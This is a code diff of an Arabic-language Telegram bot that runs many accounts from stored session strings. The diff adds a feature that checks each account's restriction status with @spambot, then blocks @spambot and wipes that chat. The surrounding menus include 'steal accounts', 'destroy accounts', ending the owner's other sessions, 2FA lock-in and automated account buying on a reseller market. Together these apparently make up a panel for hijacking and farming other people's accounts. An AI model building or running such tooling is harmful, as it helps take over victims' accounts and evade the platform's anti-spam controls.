@@ -2453,10 +2453,11 @@ def home_keyboard(uid):
     markup.row(InlineKeyboardButton("• إنـهـاء الـجـلـسـات الأُخـرى ☠️", callback_data="menu_terminate"))
     markup.row(InlineKeyboardButton("• إدارة الإزالـة الـتـلـقـائـيـة ⏱️", callback_data="autoterm_manage"))
     markup.row(InlineKeyboardButton("• إدارة الـريـسـت والـقـفـل 🔒", callback_data="menu_pass_reset_manage"))
-    
-    # زر اليوزرات اللي ضفناه
+    markup.row(InlineKeyboardButton("• إدارة الـسـبـام بـلـوك 🚫", callback_data="spam_manage"))
+
+
     markup.row(InlineKeyboardButton("• إدارة فـحـص الـيـوزرات 🔠", callback_data="usernames_manage"))
-    
+
     markup.row(InlineKeyboardButton("• تـنـظـيـف شـامـل 🧹", callback_data="menu_clean"), InlineKeyboardButton("• جـلـب الـكـود ✉️", callback_data="req_code"))
     markup.row(InlineKeyboardButton("• إزالـة مـن الـبـوت 🗑️", callback_data="menu_remove"), InlineKeyboardButton("• تـسـجـيـل خـروج 🚪", callback_data="menu_logout"))
     markup.row(InlineKeyboardButton("• إدارة الـتـحـقـق بـخـطـوتـيـن 🔐", callback_data="menu_2fa_manage"))
@@ -2467,10 +2468,10 @@ def home_keyboard(uid):
     if uid in ADMIN_IDS:
         markup.row(InlineKeyboardButton("• إضافـة مسـتخـدم ➕", callback_data="admin_add_user"), InlineKeyboardButton("• حظـر مسـتخـدم 🚫", callback_data="admin_ban_user"))
         markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"), InlineKeyboardButton("• تـدمـيـر الـحـسـابـات 🔴", callback_data="admin_destroy_accounts"))
-        
+
         # 🔥 رجعنا حبيب الشعب (الشراء التلقائي LZT) هنا للآدمن
         markup.row(InlineKeyboardButton("🛒 تخصيص الشراء التلقائي (LZT)", callback_data="auto_buy_menu"))
-        
+
         # إذا تبي زر تيك توك يرجع شيل علامة المربع (#) من السطر اللي تحت:
         # markup.row(InlineKeyboardButton("🎵 الشراء التلقائي (تيك توك)", callback_data="tt_auto_main"))
 
@@ -2609,11 +2610,11 @@ async def process_start_reset_async(owner_id, target, chat_id, msg_id):
     results = await asyncio.gather(*tasks)
 
     success_count = sum(1 for r in results if "✅" in r)
-    
+
     # --- نظام تقسيم الرسائل الذكي لتفادي خطأ MESSAGE_TOO_LONG ---
     text_chunks = []
     current_text = f"🛂┊ **تـقـريـر بـدء الـريـسـت:**\n⎉╎ الـنـجـاح: {success_count} مـن {len(accounts)}\n\n"
-    
+
     for res_text in results:
         line = res_text + "\n"
         # إذا اقتربنا من الحد الأقصى لتليجرام، نخزن الرسالة ونبدأ رسالة جديدة
@@ -2622,7 +2623,7 @@ async def process_start_reset_async(owner_id, target, chat_id, msg_id):
             current_text = "🛂┊ **تـكـمـلـة تـقـريـر الـريـسـت:**\n\n" + line
         else:
             current_text += line
-            
+
     if current_text:
         text_chunks.append(current_text)
 
@@ -2631,7 +2632,7 @@ async def process_start_reset_async(owner_id, target, chat_id, msg_id):
         is_last_chunk = (i == len(text_chunks) - 1)
         # نضع زر الرجوع للقائمة فقط في الرسالة الأخيرة
         markup = home_keyboard(owner_id) if is_last_chunk else None
-        
+
         try:
             if i == 0:
                 # الرسالة الأولى تعدل رسالة "جاري البدء..."
@@ -2718,11 +2719,11 @@ async def check_all_resets_async(owner_id, chat_id, msg_id):
     results = await asyncio.gather(*tasks)
 
     active_count = sum(res[1] for res in results)
-    
+
     # --- نظام تقسيم الرسائل الذكي لتفادي خطأ MESSAGE_TOO_LONG ---
     text_chunks = []
     current_text = f"⎉╎ الـجـلـسـات الـنـشـطـة الآن: {active_count} مـن أصـل {len(accounts)}\n\n🛂┊ نـتـيـجـة فـحـص الـحـسـابـات:\n\n"
-    
+
     for res_text, _ in results:
         # إذا اقتربنا من الحد الأقصى لتليجرام (حوالي 3900 حرف)، نخزن الرسالة ونفتح واحدة جديدة
         if len(current_text) + len(res_text) > 3900:
@@ -2730,7 +2731,7 @@ async def check_all_resets_async(owner_id, chat_id, msg_id):
             current_text = "🛂┊ تـكـمـلـة الـفـحـص:\n\n" + res_text
         else:
             current_text += res_text
-            
+
     if current_text:
         text_chunks.append(current_text)
 
@@ -2739,7 +2740,7 @@ async def check_all_resets_async(owner_id, chat_id, msg_id):
         is_last_chunk = (i == len(text_chunks) - 1)
         # نضع أزرار التحكم فقط في الرسالة الأخيرة
         markup = home_keyboard(owner_id) if is_last_chunk else None
-        
+
         try:
             if i == 0:
                 # الرسالة الأولى تعدل رسالة "جاري الفحص..."
@@ -3309,6 +3310,201 @@ def back_home(call):
 
 
 
+#داله السبام هنا
+
+
+
+
+
+# ==========================================
+# 🚫 منظومة إدارة فحص وحظر السبام بلوك 
+# ==========================================
+import re
+
+@bot.callback_query_handler(func=lambda call: call.data == "spam_manage")
+def spam_manage_menu(call):
+    if not is_allowed(call.from_user.id): return
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("🔍 فـحـص الـسـبـام", callback_data="spam_check"))
+    markup.row(InlineKeyboardButton("🚫 حـظـر الـبـوت (@spambot)", callback_data="spam_block_menu"))
+    markup.row(InlineKeyboardButton("🔙 رجـوع لـلـرئـيـسـيـة", callback_data="back_home"))
+    
+    text = (
+        "🛂┊ **إدارة الـسـبـام بـلـوك:**\n\n"
+        "⎉╎ **فـحـص:** يـتـواصـل مـع `@spambot` لـمـعـرفـة حـالـة الـحـسـابـات.\n"
+        "⎉╎ **حـظـر:** لـحـظـر `@spambot` ومـسـح الـمـحـادثـة لـلـحـمـايـة."
+    )
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+# --- 1. دالة فحص السبام ---
+async def check_single_spam(acc_id, phone, pyro_session, uid):
+    async with account_semaphore:
+        client = Client(f"spam_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+        try:
+            await asyncio.wait_for(client.connect(), timeout=8)
+            # فك الحظر عن البوت تحسباً لو كان محظوراً لكي نستطيع إرسال start
+            try: await client.unblock_user("spambot")
+            except: pass
+            
+            await client.send_message("spambot", "/start")
+            await asyncio.sleep(2.5) # انتظار الرد من تليجرام
+            
+            status = "❌ مـحـظـور دائـم"
+            is_spam = True
+            
+            async for msg in client.get_chat_history("spambot", limit=1):
+                if msg.text:
+                    text = msg.text.lower()
+                    if "رائع" in text or "good news" in text or "لاتوجد قيود" in text or "no limits" in text or "حر طليق" in text:
+                        status = "✅ حـر"
+                        is_spam = False
+                    elif "تاريخ" in text or "until" in text:
+                        # استخراج التاريخ
+                        date_match = re.search(r'(?:تاريخ|until)\s+([0-9]+\s+[a-zA-Z]+\s+[0-9]{4}(?:,\s+[0-9:]+\s+[a-zA-Z]+)?)', msg.text, re.IGNORECASE)
+                        date_str = date_match.group(1) if date_match else "غـيـر مـعـروف"
+                        status = f"🟡 مـؤقـت (إلـى {date_str})"
+                        is_spam = True
+                    elif "نعتذر" in text or "unfortunately" in text or "afraid" in text or "قاسية" in text:
+                        status = "❌ مـحـظـور دائـم"
+                        is_spam = True
+                        
+            await client.disconnect()
+            
+            # تسجيل الحساب في قائمة السبام المؤقتة إذا كان محظوراً لاستخدامها في زر (تطبيق على السبام فقط)
+            if is_spam:
+                if "spam_accounts" not in USER_STATES.get(uid, {}):
+                    if uid not in USER_STATES: USER_STATES[uid] = {}
+                    USER_STATES[uid]["spam_accounts"] = set()
+                USER_STATES[uid]["spam_accounts"].add(acc_id)
+                
+            return f"⎉╎ `{phone}` | {status}\n"
+        except Exception as e:
+            if client.is_connected: await client.disconnect()
+            return f"⎉╎ `{phone}` | ⚠️ فـشـل الاتـصـال\n"
+
+@bot.callback_query_handler(func=lambda call: call.data == "spam_check")
+def spam_check_action(call):
+    uid = call.from_user.id
+    if not is_allowed(uid): return
+    accounts = get_all_accounts(uid)
+    if not accounts: return bot.answer_callback_query(call.id, "❌ لا توجد حسابات مسجلة!", show_alert=True)
+
+    bot.edit_message_text("⏳ **جـاري فـحـص حـالـة الـسـبـام لـكـافـة الـحـسـابـات بـسـرعـة...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+    
+    # تصفير كاش السبام قبل الفحص الجديد
+    if uid not in USER_STATES: USER_STATES[uid] = {}
+    USER_STATES[uid]["spam_accounts"] = set()
+
+    async def run_spam_check():
+        tasks = [check_single_spam(acc[0], acc[1], acc[4], uid) for acc in accounts]
+        results = await asyncio.gather(*tasks)
+        
+        # نظام التقسيم لتجنب خطأ MESSAGE_TOO_LONG
+        text_chunks = []
+        current_text = "🛂┊ **نـتـيـجـة فـحـص الـسـبـام بـلـوك:**\n\n"
+        
+        for res_text in results:
+            if len(current_text) + len(res_text) > 3900:
+                text_chunks.append(current_text)
+                current_text = "🛂┊ **تـكـمـلـة فـحـص الـسـبـام:**\n\n" + res_text
+            else:
+                current_text += res_text
+                
+        if current_text:
+            text_chunks.append(current_text)
+            
+        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="spam_manage"))
+        
+        for i, chunk in enumerate(text_chunks):
+            is_last_chunk = (i == len(text_chunks) - 1)
+            current_markup = markup if is_last_chunk else None
+            try:
+                if i == 0:
+                    bot.edit_message_text(chunk, call.message.chat.id, call.message.message_id, reply_markup=current_markup, parse_mode="Markdown")
+                else:
+                    bot.send_message(call.message.chat.id, chunk, reply_markup=current_markup, parse_mode="Markdown")
+                    await asyncio.sleep(0.3)
+            except Exception: pass
+            
+    run_async(run_spam_check())
+
+# --- 2. قوائم حظر البوت @spambot ---
+@bot.callback_query_handler(func=lambda call: call.data == "spam_block_menu")
+def spam_block_menu(call):
+    uid = call.from_user.id
+    if not is_allowed(uid): return
+    accounts = get_all_accounts(uid)
+    if not accounts: return bot.answer_callback_query(call.id, "❌ لا توجد حسابات مسجلة!", show_alert=True)
+
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="act_spamblock:all"))
+    markup.row(InlineKeyboardButton("❌ تـطـبـيـق عـلـى الـسـبـام فـقـط", callback_data="act_spamblock:spam_only"))
+    
+    for acc in accounts:
+        markup.row(InlineKeyboardButton(f"{acc[2]} | {acc[1]}", callback_data=f"act_spamblock:{acc[0]}"))
+        
+    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="spam_manage"))
+    
+    text = "🛂┊ **حـظـر بـوت الـسـبـام (@spambot):**\n\n⎉╎ سـيـتـم حـظـر الـبـوت ومـسـح الـمـحـادثـة مـعـه نـهـائـيـاً لـلـحـمـايـة.\n⎉╎ اخـتـر نـطـاق الـتـطـبـيـق:"
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+# --- 3. دالة الحظر الفعلية ---
+async def block_single_spambot(acc_id, pyro_session):
+    async with account_semaphore:
+        client = Client(f"sblk_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+        try:
+            await asyncio.wait_for(client.connect(), timeout=8)
+            # حظر البوت
+            await client.block_user("spambot")
+            # مسح المحادثة بشكل نهائي
+            peer = await client.resolve_peer("spambot")
+            await client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
+            await client.disconnect()
+            return True
+        except Exception:
+            if client.is_connected: await client.disconnect()
+            return False
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("act_spamblock:"))
+def execute_spamblock_action(call):
+    uid = call.from_user.id
+    if not is_allowed(uid): return
+    target = call.data.split(":")[1]
+    
+    accounts = get_all_accounts(uid)
+    
+    if target == "spam_only":
+        spam_cache = USER_STATES.get(uid, {}).get("spam_accounts", set())
+        if not spam_cache:
+            return bot.answer_callback_query(call.id, "⚠️ يرجى عمل 'فحص السبام' أولاً لكي يتعرف البوت على الحسابات المحظورة!", show_alert=True)
+        accounts = [a for a in accounts if a[0] in spam_cache]
+        if not accounts:
+            return bot.answer_callback_query(call.id, "✅ جميع حساباتك سليمة، لا يوجد حسابات سبام لحظرها!", show_alert=True)
+    elif target != "all":
+        accounts = [a for a in accounts if str(a[0]) == target]
+
+    bot.edit_message_text("⏳ **جـاري حـظـر `@spambot` ومـسـح الـمـحـادثـة...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+
+    async def run_block():
+        tasks = [block_single_spambot(acc[0], acc[4]) for acc in accounts]
+        results = await asyncio.gather(*tasks)
+        
+        success_count = sum(1 for r in results if r)
+        
+        msg = (
+            f"🛂┊ **تـم حـظـر `@spambot` ومـسـح الـمـحـادثـة!**\n\n"
+            f"⎉╎ **نـجـح:** `{success_count}` مـن أصـل `{len(accounts)}` حـسـاب."
+        )
+        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="spam_manage"))
+        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+    run_async(run_block())
+
+
+
+
+
+
 
 
 import html
@@ -3343,15 +3539,15 @@ def reveal_accounts(call):
 
     batch_size = 15
     account_batches = [fetched_data[i:i + batch_size] for i in range(0, len(fetched_data), batch_size)]
-    
+
     for index, batch in enumerate(account_batches):
         text = f"<b>🛂┊ كشـف الحـسـابات ({len(accounts)} حـسـاب):</b>\n\n" if index == 0 else f"<b>🛂┊ تـكـمـلـة الـحـسـابـات (الـجـزء {index + 1}):</b>\n\n"
-        
+
         for acc_id, phone, name, uid, me in batch:
             safe_phone = html.escape(str(phone))
             safe_uid = html.escape(str(uid))
             creation_year = get_creation_year(uid)
-            
+
             # تحديد اليوزر أو الاسم
             if me and me.username:
                 display_name = f"@{html.escape(me.username)}"
@@ -3376,14 +3572,14 @@ def reveal_accounts(call):
         else:
             bot.send_message(call.message.chat.id, text, reply_markup=markup, parse_mode="HTML")
             time.sleep(0.3)
-           
-          
-         
-        
-       
-      
-     
-     
+
+
+
+
+
+
+
+
 
 @bot.callback_query_handler(func=lambda call: call.data == "view_sessions_menu")
 def view_sessions_menu(call):
@@ -3484,7 +3680,7 @@ def usernames_manage_menu(call):
     markup.row(InlineKeyboardButton("🔍 فـحـص الـيـوزرات", callback_data="usernames_check"))
     markup.row(InlineKeyboardButton("🗑️ تـحـريـر الـيـوزرات", callback_data="usernames_release_menu"))
     markup.row(InlineKeyboardButton("🔙 رجـوع لـلـرئـيـسـيـة", callback_data="back_home"))
-    
+
     text = (
         "🛂┊ **إدارة فـحـص وتـحـريـر الـيـوزرات:**\n\n"
         "⎉╎ **فـحـص:** يـعـرض كـافـة يـوزرات الـحـسـابـات مـع أرقـامـهـا.\n"
@@ -3495,49 +3691,49 @@ def usernames_manage_menu(call):
 @bot.callback_query_handler(func=lambda call: call.data == "usernames_check")
 def usernames_check_action(call):
     if not is_allowed(call.from_user.id): return
-    
+
     accounts = get_all_accounts(call.from_user.id)
     if not accounts:
         return bot.answer_callback_query(call.id, "❌ لا توجد حسابات مسجلة للفحص!", show_alert=True)
 
     bot.edit_message_text("⏳ <b>جـاري فـحـص يـوزرات الـحـسـابـات بـسـرعـة...</b>", call.message.chat.id, call.message.message_id, parse_mode="HTML")
-    
+
     # استخدام الدالة الآمنة لجمع البيانات بـ 50 اتصال بنفس الوقت
     fetched_data = run_async(gather_account_info_safe(accounts))
-    
+
     # تجهيز نظام تقسيم الرسائل لتفادي خطأ طول الرسالة
     text_chunks = []
     current_text = "<b>🛂┊ نـتـيـجـة فـحـص الـيـوزرات:</b>\n\n"
-    
+
     for acc_id, phone, name, uid, me in fetched_data:
         # جلب اليوزر (الـ HTML يتجاهل الشرطات السفلية ويعرضها كما هي بدون مشاكل)
         if me and me.username:
             user_display = f"@{html.escape(me.username)}"
         else:
             user_display = "----"
-            
+
         # تجهيز السطر الخاص بكل حساب
         line = f"⎉╎ <b>{user_display}</b> | <code>{phone}</code>\n"
-        
+
         # إذا اقتربنا من الحد الأقصى لتليجرام (3900 حرف)، نحفظ الرسالة ونبدأ رسالة جديدة
         if len(current_text) + len(line) > 3900:
             text_chunks.append(current_text)
             current_text = "<b>🛂┊ تـكـمـلـة الـيـوزرات:</b>\n\n" + line
         else:
             current_text += line
-            
+
     # إضافة آخر دفعة إلى القائمة
     if current_text:
         text_chunks.append(current_text)
-        
+
     markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="usernames_manage"))
-    
+
     # إرسال الرسائل بالترتيب
     for i, chunk in enumerate(text_chunks):
         is_last_chunk = (i == len(text_chunks) - 1)
         # نضع الزر فقط في الرسالة الأخيرة
         current_markup = markup if is_last_chunk else None
-        
+
         try:
             if i == 0:
                 # الرسالة الأولى تعدل رسالة "جاري الفحص..."
@@ -3552,37 +3748,37 @@ def usernames_check_action(call):
 @bot.callback_query_handler(func=lambda call: call.data == "usernames_release_menu")
 def usernames_release_menu(call):
     if not is_allowed(call.from_user.id): return
-    
+
     accounts = get_all_accounts(call.from_user.id)
     if not accounts:
         return bot.answer_callback_query(call.id, "❌ لا توجد حسابات مسجلة!", show_alert=True)
 
     bot.edit_message_text("⏳ **جـاري جـلـب الـحـسـابـات الـتـي تـحـتـوي عـلـى يـوزرات...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
-    
+
     fetched_data = run_async(gather_account_info_safe(accounts))
-    
+
     markup = InlineKeyboardMarkup()
     has_usernames = False
-    
+
     for acc_id, phone, name, uid, me in fetched_data:
         if me and me.username:
             has_usernames = True
             # النص داخل الأزرار آمن ولا يتأثر بالماركدون أبداً
             markup.row(InlineKeyboardButton(f"@{me.username} | {phone}", callback_data=f"act_release:{acc_id}"))
-            
+
     if has_usernames:
         markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="act_release:all"))
-    
+
     markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="usernames_manage"))
-    
+
     # تفعيل حالة التحرير لانتظار الـ @
     USER_STATES[call.from_user.id] = {"action": "wait_for_username_release"}
-    
+
     if has_usernames:
         text = "🛂┊ **تـحـريـر الـيـوزرات:**\n\n⎉╎ **اخـتـر يـوزراً لـتـحـريـره أو أرسـل الـيـوزر بـالـشـكـل `@user`**"
     else:
         text = "🛂┊ **لا يـوجـد أي حـسـاب يـحـتـوي عـلـى يـوزر حـالـيـاً.**"
-        
+
     bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
 # دالة التحرير الفعلية عبر الأزرار
@@ -3590,9 +3786,9 @@ def usernames_release_menu(call):
 def execute_release_username(call):
     if not is_allowed(call.from_user.id): return
     target = call.data.split(":")[1]
-    
+
     bot.edit_message_text("⏳ **جـاري تـحـريـر الـيـوزر(ات)...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
-    
+
     async def do_release(acc_id, pyro_session):
         async with account_semaphore: # يلتزم بـ 50 اتصال بنفس الوقت
             client = Client(f"rel_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
@@ -3609,12 +3805,12 @@ def execute_release_username(call):
         accounts = get_all_accounts(call.from_user.id)
         if target != "all":
             accounts = [a for a in accounts if str(a[0]) == target]
-            
+
         tasks = [do_release(acc[0], acc[4]) for acc in accounts]
         results = await asyncio.gather(*tasks)
-        
+
         success_count = sum(1 for r in results if r)
-        
+
         msg = (
             f"🛂┊ **تـمـت عـمـلـيـة تـحـريـر الـيـوزرات!**\n\n"
             f"⎉╎ **الـنـجـاح:** `{success_count}` حـسـاب\n"
@@ -3630,10 +3826,10 @@ def execute_release_username(call):
 def handle_text_username_release(message):
     uid = message.from_user.id
     if not is_allowed(uid): return
-    
+
     text = message.text.strip()
     target_username = None
-    
+
     # فحص نوع الرد
     if text.startswith('@@'):
         target_username = text[2:].lower() # إزالة الـ @@
@@ -3643,15 +3839,15 @@ def handle_text_username_release(message):
             target_username = text[1:].lower() # إزالة الـ @
         else:
             return # إذا أرسل @ واحدة وهو خارج قسم التحرير، البوت لا يتجاوب
-            
+
     if not target_username: return
-    
+
     # استخدام HTML لحماية الرد من الشرطات السفلية الخاصة باليوزر
     status_msg = bot.reply_to(message, f"⏳ <b>جـاري الـبـحـث عـن <code>@{html.escape(target_username)}</code> وتـحـريـره...</b>", parse_mode="HTML")
-    
+
     async def find_and_release(target):
         accounts = get_all_accounts(uid)
-        
+
         # دالة للبحث والتحرير الداخلي
         async def check_and_remove(acc_id, pyro_session):
             async with account_semaphore:
@@ -3670,13 +3866,13 @@ def handle_text_username_release(message):
 
         tasks = [check_and_remove(acc[0], acc[4]) for acc in accounts]
         results = await asyncio.gather(*tasks)
-        
+
         if any(results):
             return True
         return False
-        
+
     success = run_async(find_and_release(target_username))
-    
+
     if success:
         msg = (
             f"🛂┊ <b>تـمـت تـحـريـر الـيـوزر <code>@{html.escape(target_username)}</code> بـنـجـاح!</b>\n\n"
@@ -3684,7 +3880,7 @@ def handle_text_username_release(message):
         )
     else:
         msg = f"🛂┊ <b>لـم يـتـم الـعـثـور عـلـى الـيـوزر <code>@{html.escape(target_username)}</code> فـي أي حـسـاب تـمـلـكـه.</b>"
-        
+
     bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode="HTML")
 
 
@@ -4814,12 +5010,12 @@ def execute_unsurveil(call):
 
 if __name__ == "__main__":
     logging.info("🚀 جاري إطلاق البوت...")
-    
+
     try:
         bot.remove_webhook()
     except Exception:
         pass
-        
+
     while True:
         try:
             logging.info("📡 جاري الاتصال بسيرفرات تليجرام...")
